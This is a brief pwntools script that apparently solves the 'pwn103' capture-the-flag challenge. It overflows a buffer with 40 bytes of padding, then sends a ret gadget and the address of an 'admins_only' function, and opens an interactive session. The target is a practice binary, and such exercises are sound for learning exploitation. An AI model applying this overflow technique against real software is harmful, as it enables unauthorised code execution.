from pwn import *


p = process("./pwn103-1644300337872.pwn103")

padding = b"A"*40

ret = p64(0x401016)
admins_only = p64(0x401554)
buffow = padding+ret+admins_only

p.sendline("3")
p.sendline(buffow)
p.sendline("\n")

p.interactive()
